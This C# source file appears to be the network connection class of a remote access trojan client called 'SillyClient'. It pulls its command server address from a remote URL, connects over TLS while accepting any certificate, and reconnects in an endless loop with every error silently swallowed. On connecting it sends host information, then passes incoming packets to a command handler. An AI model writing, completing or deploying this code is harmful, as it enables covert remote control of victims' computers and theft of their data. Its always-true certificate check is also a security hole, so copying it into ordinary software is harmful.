﻿using Client.Things;
using Client.Handlers;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Net.Http;

namespace Client.Connection
{
    internal class SillyClient
    {
        public static int OneMb = 1000000;
        public static TcpClient tcpClient { get; set; }
        private static SslStream sslStream { get; set; }
        private static CancellationTokenSource cancellationToken { get; set; }
        private static object SendOneByOne { get; set; }
        public static void Connect()
        {
            try
            {
                string host = Config.Host;
                int port = Config.Port;

                if (!string.IsNullOrEmpty(Config.Raw) && Config.Raw.StartsWith("https://") && Config.Raw != "silly21")
                {
                    try
                    {
                        using (HttpClient client = new HttpClient())
                        {
                            string response = client.GetStringAsync(Config.Raw).Result.Trim();
                            if (!string.IsNullOrEmpty(response) && response.Contains(":"))
                            {
                                string[] parts = response.Split(':');
                                if (parts.Length == 2)
                                {
                                    host = parts[0];
                                    if (!int.TryParse(parts[1], out port))
                                    {
                                        port = Config.Port;
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }

                IPAddress[] addresses = Dns.GetHostAddresses(host);
                IPEndPoint endPoint = new IPEndPoint(addresses[0], port);

                while (true)
                {
                    if (!isConnected())
                    {
                        try
                        {
                            SendOneByOne = new object();
                            tcpClient = new TcpClient();
                            tcpClient.Connect(endPoint);
                            tcpClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                            sslStream = new SslStream(tcpClient.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate));
                            sslStream.AuthenticateAsClient(host);
                        }
                        catch { }
                    }
                    else
                    {
                        if (cancellationToken == null)
                        {
                            cancellationToken = new CancellationTokenSource();
                            Task.Run(() => { Recieve(); }, cancellationToken.Token);
                            Send(new Info().Get());
                            Stuff.Pack pack = new Stuff.Pack();
                            pack.Set("Packet", "Ping");
                            pack.Set("Message", "How are you?");
                            Send(pack.Pacc());
                        }
                    }
                    Thread.Sleep(500);
                }
            }
            catch (Exception)
            {
                Disconnect();
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        public static void Reconnect()
        {
            try
            {
                tcpClient?.Dispose();
                sslStream?.Dispose();
                cancellationToken?.Dispose();
            } catch { }
            tcpClient = null;
        }

        private static async void Recieve()
        {
            try
            {
                while (true)
                {
                    if (tcpClient == null)
                    {
                        Reconnect();
                        Connect();
                    }
                    byte[] bytes = new byte[4];
                    int byteSize = await sslStream.ReadAsync(bytes, 0, bytes.Length);
                    byteSize = BitConverter.ToInt32(bytes, 0);
                    if (byteSize > 0)
                    {
                        bytes = new byte[byteSize];
                        int totalRecieved = 0;
                        while (totalRecieved < byteSize)
                        {
                            totalRecieved += await sslStream.ReadAsync(bytes, totalRecieved, bytes.Length - totalRecieved);
                        }
                        ThreadPool.QueueUserWorkItem(state =>
                        {
                            new HandlePacket
                            {
                                packet = bytes
                            }.Run(state);
                        }, null);
                    }
                    else
                    {
                        Disconnect();
                    }
                }
            }
            catch (Exception)
            {
                Disconnect();
            }
        }

        public static void Send(byte[] bytes)
        {
            lock (SendOneByOne)
            {
                try
                {
                    byte[] byteSize = BitConverter.GetBytes(bytes.Length);
                    sslStream.Write(byteSize, 0, byteSize.Length);

                    if (bytes.Length > OneMb)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(bytes))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[OneMb];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                sslStream.Write(chunk, 0, read);
                            }
                        }
                    }
                    else
                    {
                        sslStream.Write(bytes, 0, bytes.Length);
                    }

                }
                catch (Exception)
                {
                    Disconnect();
                }
            }
        }

        public static bool isConnected()
        {
            if (tcpClient == null) return false;
            return tcpClient.Connected;
        }
        public static SslStream GetStream()
        {
            return sslStream;
        }

        public static void Disconnect()
        {
            try
            {
                Debug.WriteLine("Disconnected");
                cancellationToken?.Cancel();
                tcpClient?.Close();
                sslStream?.Close();
                tcpClient = null;
                cancellationToken = null;
                GC.Collect();
            }
            catch { }
        }
    }
}
